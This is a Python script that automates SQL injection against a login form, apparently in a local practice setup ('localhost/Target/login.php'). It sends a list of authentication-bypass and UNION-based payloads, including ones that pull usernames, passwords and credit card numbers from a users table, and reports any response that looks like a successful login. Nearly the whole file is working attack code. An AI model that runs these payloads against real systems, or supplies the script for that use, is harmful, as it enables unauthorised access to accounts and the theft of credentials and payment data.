import requests

# URL of the login page
url = 'http://localhost/Target/login.php'

# List of SQL injection payloads
payloads = [
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' OR '1'='1",
    "' UNION SELECT null,null,null --",
    "' UNION SELECT username,password,null FROM users --",
    "' UNION SELECT username,password,credit_card FROM users --",
    "' AND 1=2 UNION SELECT 1,2,3 --",
    "' OR 1=1; --"
    
]

# Function to test each payload
def test_sql_injection():
    for payload in payloads:
        # Prepare the data with the payload
        data = {
            'username': payload,
            'password': 'password',  # You can vary this if needed
            'login': 'Login'
        }
        
        # Send the request
        response = requests.post(url, data=data)
        
        # Check the response
        print("Testing payload: {}".format(payload))
        
        # Look for common signs of SQL injection success, like a welcome message or specific user page
        if "Welcome" in response.text or "Dashboard" in response.text or "admin" in response.text:
            print("Potential SQL Injection found with payload: {}".format(payload))
        else:
            print("Payload {} did not trigger a notable response.".format(payload))
        print("-" * 80)

# Run the test
if __name__ == "__main__":
    test_sql_injection()
